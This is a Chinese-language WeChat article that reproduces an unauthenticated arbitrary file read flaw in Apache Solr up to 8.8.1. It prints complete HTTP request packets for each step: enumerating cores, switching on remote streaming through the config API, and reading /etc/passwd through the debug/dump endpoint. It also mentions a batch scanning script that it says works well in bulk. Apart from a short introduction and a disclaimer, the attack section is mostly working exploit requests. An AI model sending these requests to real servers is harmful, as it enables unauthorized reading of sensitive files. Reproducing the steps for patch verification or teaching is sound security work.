> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/SFC8X7o2kfFASHmLeD3-UQ)

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcxRotctQ6trC30PIPRE0ibOia4Iz81C9898tEbINfoo337nSZ9WT6bposJiazmRMcSSIw6LlT0MZk3g/640?wx_fmt=png)

Apache Solr 任意文件读取漏洞复现

一、简介

Solr 是一个独立的企业级搜索应用服务器，它对外提供类似于 Web-service 的 API 接口。用户可以通过 http 请求，向搜索引擎服务器提交一定格式的 XML 文件，生成索引；也可以通过 Http Get 操作提出查找请求，并得到 XML 格式的返回结果。

Apache-Solr 任意文件读取漏洞漏洞，攻击者可以在未授权的情况下读取目标服务器敏感文件和相关内容。

二、影响版本

Apache Solr <= 8.8.1

三、漏洞复现

安装：

```
Solr下载地址：
自行下载对应满足版本
http://archive.apache.org/dist/lucene/solr/
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcxRotctQ6trC30PIPRE0ibOIc3BfVY5kT0P2VRLVMIXX9LJ0BYkNv72uWdwCcRIZYnfFPTIibiatzHA/640?wx_fmt=png)

访问页面

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcxRotctQ6trC30PIPRE0ibOvFfvrBPpGJeqWs8ibxSotTrGPZ3Aljcvx4jmSPYQFXxBY3daHjoppJw/640?wx_fmt=png)

第一步：获取 core 的信息：主要是 name

```
http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json
```

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcxRotctQ6trC30PIPRE0ibOo7jWsWFgQgURGlvhdlEqLaoUzZQnsTNnp03XzyaPsEUqicHicQyTTWHQ/640?wx_fmt=png)

详细数据包

```
GET /solr/admin/cores?indexInfo=false&wt=json HTTP/1.1
Host: 127.0.0.1:8983
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36 Edg/87.0.664.52
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close
```

第二步：判断是否存在漏洞: 返回 200 并且包含 This response format is experimental.  It is likely to change in the future 可能存在，需要进一步的去读取 / etc/passwd 或者其他进行确认最终是否存在读取漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcxRotctQ6trC30PIPRE0ibOniaWmgChzgtUvEhOTXqp5dNQe35hiaxuXHt8oojwu6EAXLLbY2JOMrmQ/640?wx_fmt=png)

详细数据包：

```
POST /solr/tesla/config HTTP/1.1
Host: 127.0.0.1:8983
Content-Length: 80
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8983
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://127.0.0.1:8983/solr/tesla/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
```

第三步：读取文件 / etc/passwd:  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcxRotctQ6trC30PIPRE0ibOkSywylZM8EqCVMXs7cTbfhByBDrKT2TKbRZ7poJwib2twsxOohY8Gqw/640?wx_fmt=png)

详细数据包：

```
POST /solr/tesla/debug/dump?param=ContentStreams HTTP/1.1
Host: 127.0.0.1:8983
Content-Length: 29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8983
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://127.0.0.1:8983/solr/tesla/config
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close

stream.url=file:///etc/passwd
```

编写检测脚本：

显示读取内容：

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcxRotctQ6trC30PIPRE0ibOKLx81Uy8DYeK59H9R3MFGmyLQvpOZrgT0kXe3RKqRicxZHmrX0IvyAA/640?wx_fmt=png)

直接跑存在不现实读取内容：  

批量出来效果还是不错的

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcxRotctQ6trC30PIPRE0ibO2ricKTuB0trqmwuw351UYoz59GBvR9EibF9pvibqtl3GQXQYgv4QwdbDA/640?wx_fmt=png)

参考：

https://mp.weixin.qq.com/s/5U04Qhr_KBCznAbXe9jEeg

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article

语雀博客主页：https://www.yuque.com/thelostworld

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)